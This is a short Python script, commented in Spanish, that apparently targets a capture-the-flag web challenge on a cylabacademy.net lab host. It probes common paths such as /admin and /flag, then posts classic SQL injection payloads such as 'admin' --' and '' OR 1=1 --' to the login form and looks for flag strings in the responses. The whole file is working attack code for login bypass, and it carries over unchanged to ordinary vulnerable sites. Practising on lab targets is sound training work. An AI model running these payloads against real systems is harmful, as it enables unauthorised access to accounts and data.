import requests
from bs4 import BeautifulSoup

BASE_URL = "http://chatelaine.cylabacademy.net:11152"

s = requests.Session()

print("[*] 1. Probando endpoints comunes:")
for path in ["/", "/robots.txt", "/register", "/login", "/admin", "/profile", "/feed", "/flag"]:
    r = s.get(f"{BASE_URL}{path}")
    print(f"  {path} -> Status: {r.status_code}, Length: {len(r.text)}")
    if r.status_code == 200 and path in ["/robots.txt", "/flag"]:
        print(f"    Contenido de {path}:\n{r.text}\n")

print("\n[*] 2. Probando SQL Injection clásica en /login:")
payloads = [
    ("admin' --", "password"),
    ("admin' OR '1'='1' --", "password"),
    ("' OR 1=1 --", "password"),
    ("admin", "' OR 1=1 --"),
]

for u, p in payloads:
    r = s.post(f"{BASE_URL}/login", data={"username": u, "password": p}, allow_redirects=True)
    print(f"  Payload ('{u}', '{p}') -> Status: {r.status_code}, URL final: {r.url}, Length: {len(r.text)}")
    if "academy{" in r.text or "picoctf{" in r.text or "flag" in r.text.lower() or "/feed" in r.url or "/profile" in r.url:
        print("  [!] Posible éxito:")
        print(r.text[:500])
        break
